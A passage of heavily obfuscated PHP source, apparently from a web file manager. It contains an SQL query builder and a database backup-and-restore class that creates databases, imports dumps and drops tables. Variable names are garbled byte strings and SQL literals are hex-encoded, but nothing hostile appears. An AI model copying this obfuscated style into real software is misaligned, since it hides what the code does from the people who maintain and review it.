$©Ş½éà¨[1057], $©Ş½éà¨[1058], $©Ş½éà¨[1059], $©Ş½éà¨[1060]))) { $†½¼ŠÖÚ = $Ñ²’Ø¥[$Óáá¤ã][0]; } $ÃÍÇûé .= $©Ş½éà¨[289] . $ËÌˆÖØÕ . $©Ş½éà¨[53] . $†½¼ŠÖÚ . $©Ş½éà¨[53] . $this->parseValue($Æ±…İÃÖ) . $©Ş½éà¨[1063] . $åÓ»½ö— . $©Ş½éà¨[53]; } } $ÃÍÇûé = substr($ÃÍÇûé, 0, -4); } } else { $ÃÍÇûé .= $ËÌˆÖØÕ . $©Ş½éà¨[1067] . $this->parseValue($Ñ²’Ø¥); } return $ÃÍÇûé; } protected function parseThinkWhere($ä«üª¡ğ, $ØÅÀÏµ°) { $µâ€™ªÉ =& $_SERVER[…É¦À–]; $Ë²ÇèçÊ = $µâ€™ªÉ[12]; switch ($ä«üª¡ğ) { case $µâ€™ªÉ[381]: $Ë²ÇèçÊ = $ØÅÀÏµ°; break; case $µâ€™ªÉ[1050]: $Ë²ÇèçÊ = is_string($ØÅÀÏµ°) ? $ØÅÀÏµ° : substr($this->parseWhere($ØÅÀÏµ°), 6); break; case $µâ€™ªÉ[1068]: parse_str($ØÅÀÏµ°, $Œàªí‚È); if (isset($Œàªí‚È[$µâ€™ªÉ[1045]])) { $ƒÎö³²¤ = $µâ€™ªÉ[53] . strtoupper($Œàªí‚È[$µâ€™ªÉ[1045]]) . $µâ€™ªÉ[53]; unset($Œàªí‚È[$µâ€™ªÉ[1045]]); } else { $ƒÎö³²¤ = $µâ€™ªÉ[1049]; } $Ì³‹ëóı = array(); foreach ($Œàªí‚È as $¦ÎÚÑ¹è => $ßÂ¸¡°¼) { $Ì³‹ëóı[] = $this->parseKey($¦ÎÚÑ¹è) . $µâ€™ªÉ[1067] . $this->parseValue($ßÂ¸¡°¼); } $Ë²ÇèçÊ = implode($ƒÎö³²¤, $Ì³‹ëóı); break; } return $Ë²ÇèçÊ; } protected function parseLimit($êĞÅşƒÖ) { $Â¯ë‘•Ç =& $_SERVER[…É¦À–]; return !empty($êĞÅşƒÖ) ? $Â¯ë‘•Ç[51] . $êĞÅşƒÖ . $Â¯ë‘•Ç[53] : $Â¯ë‘•Ç[12]; } protected function parseJoin($™Ê‹¨¤±) { $²±¥ÌŒñ =& $_SERVER[…É¦À–]; $€şØËüì = $²±¥ÌŒñ[12]; if (!empty($™Ê‹¨¤±)) { if (is_array($™Ê‹¨¤±)) { foreach ($™Ê‹¨¤± as $£è‡ß => $ï¼ïÄí) { if (!1 !== stripos($ï¼ïÄí, $²±¥ÌŒñ[1069])) { $€şØËüì .= $²±¥ÌŒñ[53] . $ï¼ïÄí; } else { $€şØËüì .= $²±¥ÌŒñ[1070] . $ï¼ïÄí; } } } else { $€şØËüì .= $²±¥ÌŒñ[1070] . $™Ê‹¨¤±; } } $€şØËüì = preg_replace($²±¥ÌŒñ[1071], think_config($²±¥ÌŒñ[975]) . $²±¥ÌŒñ[1072], $€şØËüì); return $€şØËüì; } protected function parseOrder($‡¢´Ù©ë) { $¸ÊÚï½Ô =& $_SERVER[…É¦À–]; if (is_array($‡¢´Ù©ë)) { $¿áë®Ê‚ = array(); foreach ($‡¢´Ù©ë as $ñÆªÁå => $©‘’…šÍ) { if (is_numeric($ñÆªÁå)) { $¿áë®Ê‚[] = $this->parseKey($©‘’…šÍ); } else { $©‘’…šÍ = in_array(strtoupper(trim($©‘’…šÍ)), array($¸ÊÚï½Ô[1073], $¸ÊÚï½Ô[1074])) ? $¸ÊÚï½Ô[53] . $©‘’…šÍ : $¸ÊÚï½Ô[12]; if (preg_match($¸ÊÚï½Ô[1075], $ñÆªÁå)) { $¿áë®Ê‚[] = $this->parseKey($ñÆªÁå) . $©‘’…šÍ; } else { think_exception($¸ÊÚï½Ô[1076] . $ñÆªÁå); } } } $‡¢´Ù©ë = implode($¸ÊÚï½Ô[50], $¿áë®Ê‚); } return !empty($‡¢´Ù©ë) ? $¸ÊÚï½Ô[1077] . $‡¢´Ù©ë : $¸ÊÚï½Ô[12]; } protected function parseGroup($ë«—ü‹ã) { $È¹Ÿ•Ş =& $_SERVER[…É¦À–]; return !empty($ë«—ü‹ã) ? $È¹Ÿ•Ş[1078] . $ë«—ü‹ã : $È¹Ÿ•Ş[12]; } protected function parseHaving($ª¹Ñê”£) { $ôş‹…ñê =& $_SERVER[…É¦À–]; return !empty($ª¹Ñê”£) ? $ôş‹…ñê[1079] . $ª¹Ñê”£ : $ôş‹…ñê[12]; } protected function parseComment($ûìÔ‘ÏÁ) { $ô“‚ã™Ï =& $_SERVER[…É¦À–]; return !empty($ûìÔ‘ÏÁ) ? $ô“‚ã™Ï[1080] . $ûìÔ‘ÏÁ . $ô“‚ã™Ï[1081] : $ô“‚ã™Ï[12]; } protected function parseDistinct($•Á’¹á) { $¡Ùã×—Œ =& $_SERVER[…É¦À–]; return !empty($•Á’¹á) ? $¡Ùã×—Œ[1082] : $¡Ùã×—Œ[12]; } protected function parseUnion($üÎÙôï˜) { $õ‘´…ÁÌ =& $_SERVER[…É¦À–]; if (empty($üÎÙôï˜)) { return $õ‘´…ÁÌ[12]; } if (isset($üÎÙôï˜[$õ‘´…ÁÌ[377]])) { $ËÅ¥›”Î = $õ‘´…ÁÌ[1083]; unset($üÎÙôï˜[$õ‘´…ÁÌ[377]]); } else { $ËÅ¥›”Î = $õ‘´…ÁÌ[1084]; } foreach ($üÎÙôï˜ as $–¼Û†ÈÙ) { $”¡¥€á[] = $ËÅ¥›”Î . (is_array($–¼Û†ÈÙ) ? $this->buildSelectSql($–¼Û†ÈÙ) : $–¼Û†ÈÙ); } return implode($õ‘´…ÁÌ[53], $”¡¥€á); } public function insert($ÆáŠıíâ, $Ã’Õ‚½ = array(), $Ññ“§¡ü = false) { $‘µ‹ƒ¦ =& $_SERVER[…É¦À–]; $’áˆ–± = $î÷ÖÇ½“ = array(); $this->model = $Ã’Õ‚½[$‘µ‹ƒ¦[310]]; foreach ($ÆáŠıíâ as $ƒñ¬± => $§ÏëÍö¥) { if (is_array($§ÏëÍö¥) && $‘µ‹ƒ¦[326] == $§ÏëÍö¥[0]) { $î÷ÖÇ½“[] = $this->parseKey($ƒñ¬±); $’áˆ–±[] = $§ÏëÍö¥[1]; } elseif (is_scalar($§ÏëÍö¥) || is_null($§ÏëÍö¥)) { $î÷ÖÇ½“[] = $this->parseKey($ƒñ¬±); $’áˆ–±[] = $this->parseValue($§ÏëÍö¥); } } $ÕÓ“ä±± = ($Ññ“§¡ü ? $‘µ‹ƒ¦[952] : $‘µ‹ƒ¦[953]) . $‘µ‹ƒ¦[954] . $this->parseTable($Ã’Õ‚½[$‘µ‹ƒ¦[308]]) . $‘µ‹ƒ¦[948] . implode($‘µ‹ƒ¦[50], $î÷ÖÇ½“) . $‘µ‹ƒ¦[949] . implode($‘µ‹ƒ¦[50], $’áˆ–±) . $‘µ‹ƒ¦[950]; $ÕÓ“ä±± .= $this->parseLock(isset($Ã’Õ‚½[$‘µ‹ƒ¦[883]]) ? $Ã’Õ‚½[$‘µ‹ƒ¦[883]] : !1); $ÕÓ“ä±± .= $this->parseComment(!empty($Ã’Õ‚½[$‘µ‹ƒ¦[383]]) ? $Ã’Õ‚½[$‘µ‹ƒ¦[383]] : $‘µ‹ƒ¦[12]); return $this->execute($ÕÓ“ä±±, $this->parseBind(!empty($Ã’Õ‚½[$‘µ‹ƒ¦[314]]) ? $Ã’Õ‚½[$‘µ‹ƒ¦[314]] : array())); } public function selectInsert($î«Ø¯ìî, $¶ÑœĞó«, $Åç£·‘ğ = array()) { $¿Ğ·ö–î =& $_SERVER[…É¦À–]; $this->model = $Åç£·‘ğ[$¿Ğ·ö–î[310]]; if (is_string($î«Ø¯ìî)) { $î«Ø¯ìî = explode($¿Ğ·ö–î[50], $î«Ø¯ìî); } array_walk($î«Ø¯ìî, array($this, $¿Ğ·ö–î[951])); $Øê—¹ÉŠ = $¿Ğ·ö–î[1085] . $this->parseTable($¶ÑœĞó«) . $¿Ğ·ö–î[948] . implode($¿Ğ·ö–î[50], $î«Ø¯ìî) . $¿Ğ·ö–î[1063]; $Øê—¹ÉŠ .= $this->buildSelectSql($Åç£·‘ğ); return $this->execute($Øê—¹ÉŠ, $this->parseBind(!empty($Åç£·‘ğ[$¿Ğ·ö–î[314]]) ? $Åç£·‘ğ[$¿Ğ·ö–î[314]] : array())); } public function update($·‡Œ“³Ñ, $‚«ÀÀÌú) { $‹’¾¼ =& $_SERVER[…É¦À–]; $this->model = $‚«ÀÀÌú[$‹’¾¼[310]]; $Ö´Ë¤¤ê = $‹’¾¼[1086] . $this->parseTable($‚«ÀÀÌú[$‹’¾¼[308]]) . $this->parseSet($·‡Œ“³Ñ) . $this->parseWhere(!empty($‚«ÀÀÌú[$‹’¾¼[304]]) ? $‚«ÀÀÌú[$‹’¾¼[304]] : $‹’¾¼[12]) . $this->parseOrder(!empty($‚«ÀÀÌú[$‹’¾¼[394]]) ? $‚«ÀÀÌú[$‹’¾¼[394]] : $‹’¾¼[12]) . $this->parseLimit(!empty($‚«ÀÀÌú[$‹’¾¼[321]]) ? $‚«ÀÀÌú[$‹’¾¼[321]] : $‹’¾¼[12]) . $this->parseLock(isset($‚«ÀÀÌú[$‹’¾¼[883]]) ? $‚«ÀÀÌú[$‹’¾¼[883]] : !1) . $this->parseComment(!empty($‚«ÀÀÌú[$‹’¾¼[383]]) ? $‚«ÀÀÌú[$‹’¾¼[383]] : $‹’¾¼[12]); return $this->execute($Ö´Ë¤¤ê, $this->parseBind(!empty($‚«ÀÀÌú[$‹’¾¼[314]]) ? $‚«ÀÀÌú[$‹’¾¼[314]] : array())); } public function delete($æŠÑ¿– = array()) { $—ƒöÜ¨¸ =& $_SERVER[…É¦À–]; $this->model = $æŠÑ¿–[$—ƒöÜ¨¸[310]]; $ú®ş€Æ = $—ƒöÜ¨¸[1087] . $this->parseTable($æŠÑ¿–[$—ƒöÜ¨¸[308]]) . $this->parseWhere(!empty($æŠÑ¿–[$—ƒöÜ¨¸[304]]) ? $æŠÑ¿–[$—ƒöÜ¨¸[304]] : $—ƒöÜ¨¸[12]) . $this->parseOrder(!empty($æŠÑ¿–[$—ƒöÜ¨¸[394]]) ? $æŠÑ¿–[$—ƒöÜ¨¸[394]] : $—ƒöÜ¨¸[12]) . $this->parseLimit(!empty($æŠÑ¿–[$—ƒöÜ¨¸[321]]) ? $æŠÑ¿–[$—ƒöÜ¨¸[321]] : $—ƒöÜ¨¸[12]) . $this->parseLock(isset($æŠÑ¿–[$—ƒöÜ¨¸[883]]) ? $æŠÑ¿–[$—ƒöÜ¨¸[883]] : !1) . $this->parseComment(!empty($æŠÑ¿–[$—ƒöÜ¨¸[383]]) ? $æŠÑ¿–[$—ƒöÜ¨¸[383]] : $—ƒöÜ¨¸[12]); return $this->execute($ú®ş€Æ, $this->parseBind(!empty($æŠÑ¿–[$—ƒöÜ¨¸[314]]) ? $æŠÑ¿–[$—ƒöÜ¨¸[314]] : array())); } public function select($€ù§–¸õ = array()) { $ŒÃŞ¯ÖÎ =& $_SERVER[…É¦À–]; $this->model = $€ù§–¸õ[$ŒÃŞ¯ÖÎ[310]]; $œãùı¨Ó = $this->buildSelectSql($€ù§–¸õ); $úó•†Õ = isset($€ù§–¸õ[$ŒÃŞ¯ÖÎ[378]]) ? $€ù§–¸õ[$ŒÃŞ¯ÖÎ[378]] : !1; if ($úó•†Õ) { $±ÍÉÉÜ = is_string($úó•†Õ[$ŒÃŞ¯ÖÎ[94]]) ? $úó•†Õ[$ŒÃŞ¯ÖÎ[94]] : $ŒÃŞ¯ÖÎ[1088] . md5($œãùı¨Ó); $ˆ¦´óø‘ = think_cache($±ÍÉÉÜ, $ŒÃŞ¯ÖÎ[12], $úó•†Õ); if (!1 !== $ˆ¦´óø‘) { return $ˆ¦´óø‘; } } $şŠú°™² = $this->query($œãùı¨Ó, $this->parseBind(!empty($€ù§–¸õ[$ŒÃŞ¯ÖÎ[314]]) ? $€ù§–¸õ[$ŒÃŞ¯ÖÎ[314]] : array())); if ($úó•†Õ && !1 !== $şŠú°™²) { think_cache($±ÍÉÉÜ, $şŠú°™², $úó•†Õ); } return $şŠú°™²; } public function buildSelectSql($³µâ«ÇŠ = array()) { $¶Ë´Á¬ =& $_SERVER[…É¦À–]; if (isset($³µâ«ÇŠ[$¶Ë´Á¬[382]])) { if (strpos($³µâ«ÇŠ[$¶Ë´Á¬[382]], $¶Ë´Á¬[50])) { list($—¥Ç„ìÖ, $§–âñò°) = explode($¶Ë´Á¬[50], $³µâ«ÇŠ[$¶Ë´Á¬[382]]); } else { $—¥Ç„ìÖ = $³µâ«ÇŠ[$¶Ë´Á¬[382]]; } $—¥Ç„ìÖ = $—¥Ç„ìÖ ? $—¥Ç„ìÖ : 1; $§–âñò° = isset($§–âñò°) ? $§–âñò° : (is_numeric($³µâ«ÇŠ[$¶Ë´Á¬[321]]) ? $³µâ«ÇŠ[$¶Ë´Á¬[321]] : 20); $Ñ¸àœšü = $§–âñò° * ((int) $—¥Ç„ìÖ - 1); $³µâ«ÇŠ[$¶Ë´Á¬[321]] = $Ñ¸àœšü . $¶Ë´Á¬[50] . $§–âñò°; } if (think_config($¶Ë´Á¬[1089])) { $²Ş˜’üø = $¶Ë´Á¬[1090] . md5(serialize($³µâ«ÇŠ)); $®†Ï¾ö› = think_cache($²Ş˜’üø); if ($®†Ï¾ö›) { return $®†Ï¾ö›; } } $ĞØóÜÚ = $this->parseSql($this->selectSql, $³µâ«ÇŠ); $ĞØóÜÚ .= $this->parseLock(isset($³µâ«ÇŠ[$¶Ë´Á¬[883]]) ? $³µâ«ÇŠ[$¶Ë´Á¬[883]] : !1); if (isset($²Ş˜’üø)) { think_cache($²Ş˜’üø, $ĞØóÜÚ); } return $ĞØóÜÚ; } public function parseSql($·Û‹õá, $¨Ğ‘³‚Ì = array()) { $ å§µìÃ =& $_SERVER[…É¦À–]; $·Û‹õá = str_replace(array($ å§µìÃ[1091], $ å§µìÃ[1092], $ å§µìÃ[1093], $ å§µìÃ[1094], $ å§µìÃ[1095], $ å§µìÃ[1096], $ å§µìÃ[1097], $ å§µìÃ[1098], $ å§µìÃ[1099], $ å§µìÃ[1100], $ å§µìÃ[1101]), array($this->parseTable("{$¨Ğ‘³‚Ì[$ å§µìÃ[308]]}"), $this->parseDistinct(isset($¨Ğ‘³‚Ì[$ å§µìÃ[1102]]) ? $¨Ğ‘³‚Ì[$ å§µìÃ[1102]] : !1), $this->parseField(!empty($¨Ğ‘³‚Ì[$ å§µìÃ[302]]) ? $¨Ğ‘³‚Ì[$ å§µìÃ[302]] : $ å§µìÃ[189]), $this->parseJoin(!empty($¨Ğ‘³‚Ì[$ å§µìÃ[311]]) ? $¨Ğ‘³‚Ì[$ å§µìÃ[311]] : $ å§µìÃ[12]), $this->parseWhere(!empty($¨Ğ‘³‚Ì[$ å§µìÃ[304]]) ? $¨Ğ‘³‚Ì[$ å§µìÃ[304]] : $ å§µìÃ[12]), $this->parseGroup(!empty($¨Ğ‘³‚Ì[$ å§µìÃ[534]]) ? $¨Ğ‘³‚Ì[$ å§µìÃ[534]] : $ å§µìÃ[12]), $this->parseHaving(!empty($¨Ğ‘³‚Ì[$ å§µìÃ[1103]]) ? $¨Ğ‘³‚Ì[$ å§µìÃ[1103]] : $ å§µìÃ[12]), $this->parseOrder(!empty($¨Ğ‘³‚Ì[$ å§µìÃ[394]]) ? $¨Ğ‘³‚Ì[$ å§µìÃ[394]] : $ å§µìÃ[12]), $this->parseLimit(!empty($¨Ğ‘³‚Ì[$ å§µìÃ[321]]) ? $¨Ğ‘³‚Ì[$ å§µìÃ[321]] : $ å§µìÃ[12]), $this->parseUnion(!empty($¨Ğ‘³‚Ì[$ å§µìÃ[376]]) ? $¨Ğ‘³‚Ì[$ å§µìÃ[376]] : $ å§µìÃ[12]), $this->parseComment(!empty($¨Ğ‘³‚Ì[$ å§µìÃ[383]]) ? $¨Ğ‘³‚Ì[$ å§µìÃ[383]] : $ å§µìÃ[12])), $·Û‹õá); return $·Û‹õá; } public function getLastSql($­í´´Úé = '') { return $­í´´Úé ? $this->modelSql[$­í´´Úé] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($úˆÊğæÕ) { return addslashes($úˆÊğæÕ); } public function setModel($†éùé¶º) { $this->model = $†éùé¶º; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($øøÁ¯Æµ = array()) { $ï¹¿¡ùÏ =& $_SERVER[…É¦À–]; if (empty($øøÁ¯Æµ)) { $øøÁ¯Æµ = $GLOBALS[$ï¹¿¡ùÏ[6]][$ï¹¿¡ùÏ[21]]; } $this->database = $øøÁ¯Æµ; } public function model($“¯¹×èí = '') { return new ModelBase($“¯¹×èí, $_SERVER[…É¦À–][12], $this->database); } public function db($ÍïÉå„û = false) { $ÜÂä¬ú =& $_SERVER[…É¦À–]; $ìæ©à  = array_change_key_case($this->database); if ($this->dbType() == $ÜÂä¬ú[13] || !$ÍïÉå„û) { return $this->model()->db(); } $©ÌÉª‘ = $ìæ©à [$ÜÂä¬ú[1017]]; $ìæ©à [$ÜÂä¬ú[1017]] = $ÜÂä¬ú[12]; if ($ìæ©à [$ÜÂä¬ú[1012]] == $ÜÂä¬ú[1009]) { $ÆÁüìç = $ìæ©à [$ÜÂä¬ú[1018]]; $ìæ©à [$ÜÂä¬ú[1018]] = substr($ÆÁüìç, 0, strrpos($ÆÁüìç, $ÜÂä¬ú[1104])); } $this->database = $ìæ©à ; $Å¡öŠœŠ = $this->model()->db(); try { $½ÛäÕÓä = $Å¡öŠœŠ->execute("\x73\x68\157\x77\40\x64\141\164\141\142\x61\x73\x65\163\40\x6c\151\x6b\x65\40\x27{$©ÌÉª‘}\x27"); } catch (Exception $Á–Ï±‘¯) { } if (!$½ÛäÕÓä) { $Å¡öŠœŠ->execute("\x63\162\145\x61\x74\x65\x20\144\x61\164\141\x62\141\163\x65\40\x60{$©ÌÉª‘}\140"); } $ìæ©à [$ÜÂä¬ú[1017]] = $©ÌÉª‘; if ($ìæ©à [$ÜÂä¬ú[1012]] == $ÜÂä¬ú[1009]) { $ìæ©à [$ÜÂä¬ú[1018]] .= $ÜÂä¬ú[1104] . $©ÌÉª‘; } $this->database = $ìæ©à ; $Å¡öŠœŠ->execute("\x75\x73\145\40\x60{$©ÌÉª‘}\x60"); return $Å¡öŠœŠ; } public function createTable($ìî¦¡, &$üßú§½İ) { $¸“¬‡»ë =& $_SERVER[…É¦À–]; if (!IO::exist($ìî¦¡)) { ActionCall($¸“¬‡»ë[1105], !0, 0); show_json(LNG($¸“¬‡»ë[1106]), !1); } $ÒŞìóÃÛ = $this->model()->db(); $ïıÄ Ñ¯ = sqlSplit(IO::getContent($ìî¦¡)); foreach ($ïıÄ Ñ¯ as $ñ«»¤ñå) { $ÍÇä­ö = stripos($ñ«»¤ñå, $¸“¬‡»ë[1107]) === 0; if ($ÍÇä­ö) { $üßú§½İ->task[$¸“¬‡»ë[826]] += 1; } $ÒŞìóÃÛ->execute($ñ«»¤ñå); if ($ÍÇä­ö) { preg_match($¸“¬‡»ë[1108], $ñ«»¤ñå, $²Ù¹Äúï); $üßú§½İ->task[$¸“¬‡»ë[1109]] = $²Ù¹Äúï[1]; $üßú§½İ->update(1); } } } public function insertTable($“’¹íô, &$ÌÖÆÇÜ) { $‚ŠáˆÇ½ =& $_SERVER[…É¦À–]; $·’Ÿ”¥ñ = $this->model()->db(); $®à£×ç¥ = $ø˜ıŒÓ ? array($ø˜ıŒÓ) : $·’Ÿ”¥ñ->getTables(); foreach ($“’¹íô as $Ÿåê¢ú°) { $ø˜ıŒÓ = basename($Ÿåê¢ú°, $‚ŠáˆÇ½[828]); if (!in_array($ø˜ıŒÓ, $®à£×ç¥)) { continue; } $ÌÖÆÇÜ->task[$‚ŠáˆÇ½[1109]] = $ø˜ıŒÓ; if (get_filesize($Ÿåê¢ú°) == 0) { continue; } $˜­ÀÀåÚ = $this->sqlToDb($Ÿåê¢ú°, $ÌÖÆÇÜ); if (!$˜­ÀÀåÚ) { ActionCall($‚ŠáˆÇ½[1105], !0, 0); show_json(LNG($‚ŠáˆÇ½[1110]) . "\x5b{$ø˜ıŒÓ}\135", !1); } } } public function sqlFromDb($Õò‡ÀÚ­, $±ê¶, &$üåÍ·ôë, $ÖÍñÑşğ = '') { if ($üåÍ·ôë) { $üåÍ·ôë->task[$_SERVER[…É¦À–][1109]] = $Õò‡ÀÚ­; } $¥ûÕÊ¿ = $this->model($Õò‡ÀÚ­); $à¢İÕóí = 0; $ÚÉµ¯ø» = 0; $Åï‚ó™Ø = 10000; $±¢ä‘Š = fopen($±ê¶, $_SERVER[…É¦À–][1111]); $ÉéˆŞ€× = $¥ûÕÊ¿->getPk(); $ê‘ˆ—¶ = $¥ûÕÊ¿->getDbFields(); $ûºŠÙÛî = $_SERVER[…É¦À–][12]; if ($GLOBALS[$_SERVER[…É¦À–][827]] && in_array($Õò‡ÀÚ­, array($_SERVER[…É¦À–][1112], $_SERVER[…É¦À–][1113]))) { $ûºŠÙÛî = $Õò‡ÀÚ­; } do { $óæØ„ÒĞ = array($ÉéˆŞ€× => array($_SERVER[…É¦À–][1059], $ÚÉµ¯ø»)); $®»Š«ˆ† = $¥ûÕÊ¿->where($óæØ„ÒĞ)->field($ê‘ˆ—¶)->order($ÉéˆŞ€× . $_SERVER[…É¦À–][1114])->limit($Åï‚ó™Ø)->select(); $®»Š«ˆ† = !empty($®»Š«ˆ†) ? $®»Š«ˆ† : array(); if (!($—òÃá™è = count($®»Š«ˆ†))) { break; } $›ååÁ° = end($®»Š«ˆ†); $ÚÉµ¯ø» = $›ååÁ°[$ÉéˆŞ€×]; $Â –ìÔƒ = array(); foreach ($®»Š«ˆ† as $®ßßŞ±Ë) { if ($ûºŠÙÛî) { if ($Õò‡ÀÚ­ == $_SERVER[…É¦À–][1112]) { if ($®ßßŞ±Ë[$_SERVER[…É¦À–][33]] == $_SERVER[…É¦À–][1115]) { $·æ­Òõ = json_decode($®ßßŞ±Ë[$_SERVER[…É¦À–][403]], !0); if ($·æ­Òõ[$_SERVER[…É¦À–][32]] == $GLOBALS[$_SERVER[…É¦À–][827]] && $·æ­Òõ[$_SERVER[…É¦À–][790]] != 1) { continue; } } } else { if ($®ßßŞ±Ë[$_SERVER[…É¦À–][33]] == $_SERVER[…É¦À–][1116] && $®ßßŞ±Ë[$_SERVER[…É¦À–][94]] == $_SERVER[…É¦À–][819]) { continue; } } } if ($ÖÍñÑşğ) { $®ßßŞ±Ë[$_SERVER[…É¦À–][84]] = "\173\151\x6f\x3a{$ÖÍñÑşğ}\175" . substr($®ßßŞ±Ë[$_SERVER[…É¦À–][84]], strlen("\x7b\x69\x6f\x3a{$®ßßŞ±Ë[$_SERVER[…É¦À–][857]]}\x7d")); $®ßßŞ±Ë[$_SERVER[…É¦À–][857]] = $ÖÍñÑşğ; } $Â –ìÔƒ[] = $_SERVER[…É¦À–][1117] . $this->sqlEncode($®ßßŞ±Ë) . $_SERVER[…É¦À–][1118]; } $óÍ…¦ = "\111\x4e\x53\x45\122\x54\40\111\x4e\124\117\x20\140{$Õò‡ÀÚ­}\x60\x20\x28\x60" . implode($_SERVER[…É¦À–][1119], $ê‘ˆ—¶) . $_SERVER[…É¦À–][1120]; fwrite($±¢ä‘Š, $óÍ…¦ . implode($_SERVER[…É¦À–][1121], $Â –ìÔƒ) . $_SERVER[…É¦À–][71] . PHP_EOL); $à¢İÕóí += $—òÃá™è; if ($üåÍ·ôë) { $üåÍ·ôë->update($—òÃá™è); } } while ($Åï‚ó™Ø == $—òÃá™è); fclose($±¢ä‘Š); return $à¢İÕóí; } public function sqlToDb($¤×ş“ÆÔ, &$šÊ“ÖÜ) { $ÎÙÍÏ¶ =& $_SERVER[…É¦À–]; $Æ€±ëÓø = $this->model()->db(); $­å”õ–í = @fopen($¤×ş“ÆÔ, $ÎÙÍÏ¶[1122]); if (!$­å”õ–í) { return !1; } $¥Ã¤Ú¬ = 0; $ˆÌöŒÈ’ = $ÎÙÍÏ¶[12]; $Á‹ÌŸüã = array(); $–¦ˆıª = $this->dbType(); $ÇÎàªÕú = $–¦ˆıª == $ÎÙÍÏ¶[13] ? 500 : 2000; $ï¥Îä³Å = basename($¤×ş“ÆÔ, $ÎÙÍÏ¶[828]); $«ß“Éá÷ = 0; $ø¶õƒ“… = 4194304 - 104858; $éô©Á‰ = 1000000 - 104858; while (!feof($­å”õ–í)) { $ÂÅ’Ğó‰ = trim(fgets($­å”õ–í)); if (!$ÂÅ’Ğó‰) { continue; } $Ã®øÆÆı = $this->sqlDecode($ÂÅ’Ğó‰, $–¦ˆıª, $ï¥Îä³Å); if (stripos($Ã®øÆÆı, $ÎÙÍÏ¶[384]) === 0) { if (!$ˆÌöŒÈ’) { $ˆÌöŒÈ’ = $Ã®øÆÆı . $ÎÙÍÏ¶[53]; } continue; } if ($šÊ“ÖÜ) { $šÊ“ÖÜ->task[$ÎÙÍÏ¶[826]] += 1; } $¥Ã¤Ú¬++; $Á‹ÌŸüã[] = rtrim(rtrim(trim($Ã®øÆÆı), $ÎÙÍÏ¶[50]), $ÎÙÍÏ¶[71]); $²ê´‰¤ = null; $‚Ø‰ìÕ† = strlen($Ã®øÆÆı); $«ß“Éá÷ += $‚Ø‰ìÕ†; if ($«ß“Éá÷ >= ($ÇÎàªÕú == 500 ? $éô©Á‰ : $ø¶õƒ“…)) { $²ê´‰¤ = array_pop($Á‹ÌŸüã); if ($¥Ã¤Ú¬ > 1) { $¥Ã¤Ú¬--; } } if ($¥Ã¤Ú¬ >= $ÇÎàªÕú || $²ê´‰¤) { $Ã®øÆÆı = $ˆÌöŒÈ’ . implode($ÎÙÍÏ¶[50], $Á‹ÌŸüã); if (!$Æ€±ëÓø->execute($Ã®øÆÆı)) { return !1; } if ($šÊ“ÖÜ) { $šÊ“ÖÜ->update($¥Ã¤Ú¬); } $Á‹ÌŸüã = array(); $¥Ã¤Ú¬ = 0; $«ß“Éá÷ = 0; if ($²ê´‰¤) { $Á‹ÌŸüã = array($²ê´‰¤); $¥Ã¤Ú¬ = 1; $«ß“Éá÷ = $‚Ø‰ìÕ†; } } } fclose($­å”õ–í); if (!empty($Á‹ÌŸüã)) { $Ã®øÆÆı = $ˆÌöŒÈ’ . implode($ÎÙÍÏ¶[50], $Á‹ÌŸüã); if (!$Æ€±ëÓø->execute($Ã®øÆÆı)) { return !1; } if ($šÊ“ÖÜ) { $šÊ“ÖÜ->update($¥Ã¤Ú¬); } } return !0; } public function dropTable($ı»±‹ˆŸ = null) { $²ÜÁ«¶õ = $this->model()->db(); $¶ÜÅçò— = $ı»±‹ˆŸ ? array($ı»±‹ˆŸ) : $²ÜÁ«¶õ->getTables(); if (!$¶ÜÅçò—) { return; } foreach ($¶ÜÅçò— as $ı»±‹ˆŸ) { if ($ı»±‹ˆŸ) { $ı»±‹ˆŸ = strtolower($ı»±‹ˆŸ); } else { continue; } $²ÜÁ«¶õ->execute("\x64\162\x6f\160\x20\x74\141\x62\x6c\145\40\x69\146\40\x65\170\151\x73\164\x73\40\140{$ı»±‹ˆŸ}\x60"); } } private function sqlEncode($Ä‰Ä½) { $ßƒ×•‡¶ =& $_SERVER[…É¦À–]; $ã«Ã÷ÊÙ = array(); foreach ($Ä‰Ä½ as $Ñœø—õ¼) { if (is_array($Ñœø—õ¼)) { $Ñœø—õ¼ = json_encode_force($Ñœø—õ¼); } $Ñœø—õ¼ = addslashes($Ñœø—õ¼); $Ñœø—õ¼ = str_replace(array($ßƒ×•‡¶[1123], $ßƒ×•‡¶[231]), array($ßƒ×•‡¶[1124], $ßƒ×•‡¶[1125]), $Ñœø—õ¼); $ã«Ã÷ÊÙ[] = str_replace($ßƒ×•‡¶[58], $ßƒ×•‡¶[1126], $Ñœø—õ¼); } return $ßƒ×•‡¶[58] . implode($ßƒ×•‡¶[1127], $ã«Ã÷ÊÙ) . $ßƒ×•‡¶[58]; } private function sqlDecode($éî“¿±à, $ò‰ÅĞÃ™, $Ï™³šù® = '') { $öÉ®ÁÛŸ =& $_SERVER[…É¦À–]; $éî“¿±à = str_replace(array($öÉ®ÁÛŸ[1124], $öÉ®ÁÛŸ[1125]), array($öÉ®ÁÛŸ[1123], $öÉ®ÁÛŸ[231]), $éî“¿±à); if ($ò‰ÅĞÃ™ == $öÉ®ÁÛŸ[13]) { return $Ï™³šù® != $öÉ®ÁÛŸ[1128] ? stripslashes($éî“¿±à) : $éî“¿±à; } if ($Ï™³šù® == $öÉ®ÁÛŸ[1128]) { $éî“¿±à = str_replace($öÉ®ÁÛŸ[1129], $öÉ®ÁÛŸ[118], stripslashes($éî“¿±à)); } return $éî“¿±à; } public function getSqlFile($˜€†¶Èã = '') { $ ªÜÕÚ¶ =& $_SERVER[…É¦À–]; $Æ©ş²º = $this->dbType(!0); $Óôˆôíç = CONTROLLER_DIR . "\x69\x6e\x73\164\141\154\x6c\x2f\x64\x61\164\x61\x2f{$Æ©ş²º}\56\163\x71\154"; $ıæÈÓ˜å = file_get_contents($Óôˆôíç); $÷ŸÔˆ·‹ = $ ªÜÕÚ¶[1130] . ($Æ©ş²º == $ ªÜÕÚ¶[844] ? $ ªÜÕÚ¶[1131] : $ ªÜÕÚ¶[1132]) . $ ªÜÕÚ¶[1133]; preg_match_all($÷ŸÔˆ·‹, $ıæÈÓ˜å, $¸©¿¹¤); $ûóê–ÍŞ = $¸©¿¹¤[1]; $¤À¾€÷â = $this->model()->db(); $³é±¾–Î = $¤À¾€÷â->getTables(); $±Œµí® = 